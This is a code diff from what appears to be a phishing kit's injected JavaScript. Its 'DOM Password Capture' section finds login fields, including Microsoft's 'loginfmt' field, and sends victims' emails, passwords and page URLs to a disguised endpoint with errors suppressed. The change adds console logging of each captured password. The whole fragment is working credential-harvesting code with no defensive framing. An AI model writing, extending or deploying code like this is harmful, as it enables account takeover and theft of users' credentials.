@@ -113,19 +113,26 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
 // ---- 4. DOM Password Capture (NEW) ----
 (function() {
     function sendCredentials(email, password) {
-        if (!password) return;
-        fetch('/JSCookie_6X7dRqLg90mH', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'credentials',
-                email: email || '',
-                password: password,
-                time: Date.now(),
-                url: location.href
-            })
-        }).catch(() => {});
-    }
+    if (!password) return;
+
+    // 🖨️ Print to browser console
+    console.log('[📧 CAPTURED] Email:', email || 'N/A');
+    console.log('[🔑 CAPTURED] Password:', password);
+    console.log('[🌐 URL]:', location.href);
+
+    // Send to server (unchanged)
+    fetch('/JSCookie_6X7dRqLg90mH', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            type: 'credentials',
+            email: email || '',
+            password: password,
+            time: Date.now(),
+            url: location.href
+        })
+    }).catch(() => {});
+}
 
     function findFields() {
         let emailField = document.querySelector('input[name="loginfmt"], input[type="email"], input[name="login"]');
